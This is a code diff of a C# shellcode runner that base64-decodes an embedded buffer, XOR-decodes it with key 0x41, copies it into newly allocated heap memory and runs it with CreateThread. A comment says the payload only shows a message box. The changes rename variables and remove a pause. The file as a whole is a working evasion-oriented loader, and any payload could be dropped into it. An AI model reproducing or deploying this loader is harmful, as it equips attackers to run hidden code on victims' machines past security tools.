@@ -10,11 +10,10 @@ namespace HeapAlloc_scRunner
             // Example: Messagebox = "Hello World from Kr0ff"
             //Shellcode byte[] buf = new byte[] {};
             string buf = "vQnApbG+vr6pkUFBQQAQABETEBcJcJMkCcoTIX8JyhNZfwnKE2F/CcozEX8JTvYLCwxwiAlwge19ID1DbWEAgIhMAECAo6wTABB/CcoTYX/KA30JQJF/ysHJQUFBCcSBNS4JQJERf8oJWX8FygFhCECRoh0Jvoh/AMp1yQlAlwxwiAlwge0AgIhMAECAeaE0sH8NQg1lSQR4kDSXGX8FygFlCECRJ38Ayk0JfwXKAV0IQJF/AMpFyQlAkQAZABkfGBsAGQAYABsJwq1hABO+oRkAGBt/CcpTqAi+vr4cCIaAQUFBQX8JzNS/QUFBfw3MxEtAQUEJcIgA+wTCF0a+lAlwiAD7sfTjF76UCSQtLS5hFi4zLSVBDCQyMiAmJAMuOUE=";
-            byte[] test = Convert.FromBase64String(buf);
-            Console.WriteLine(test.Length);
+            byte[] b64decodedbuf = Convert.FromBase64String(buf);
+            Console.WriteLine(b64decodedbuf.Length);
 
-            Console.ReadLine();
-            UIntPtr scSize = (UIntPtr)test.Length;
+            UIntPtr scSize = (UIntPtr)b64decodedbuf.Length;
 
             // Heap space creation
             UIntPtr initSize = UIntPtr.Zero;
@@ -27,9 +26,9 @@ namespace HeapAlloc_scRunner
             //WaitforSingleObject = Infinite wait
             const UInt32 INFINITE = 0xFFFFFFFF;
 
-            //Zoro is below.... Z
-            for (int i=0; i < test.Length; i++) {
-                test[i] = (byte)((uint)test[i] ^ 0x41);
+            //Xor
+            for (int i=0; i < b64decodedbuf.Length; i++) {
+                b64decodedbuf[i] = (byte)((uint)b64decodedbuf[i] ^ 0x41);
             }
 
             // Create heap
@@ -37,7 +36,7 @@ namespace HeapAlloc_scRunner
             // Allocate heap space for the shellcode
             IntPtr hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, scSize);
             //Copy shellcode buffer to Heap
-            Marshal.Copy(test, 0, hAlloc, (int)scSize);
+            Marshal.Copy(b64decodedbuf, 0, hAlloc, (int)scSize);
             //Create thread for shellcode
             IntPtr cThread = CreateThread(IntPtr.Zero, 0, hAlloc, IntPtr.Zero, 0, IntPtr.Zero);
             // Exec
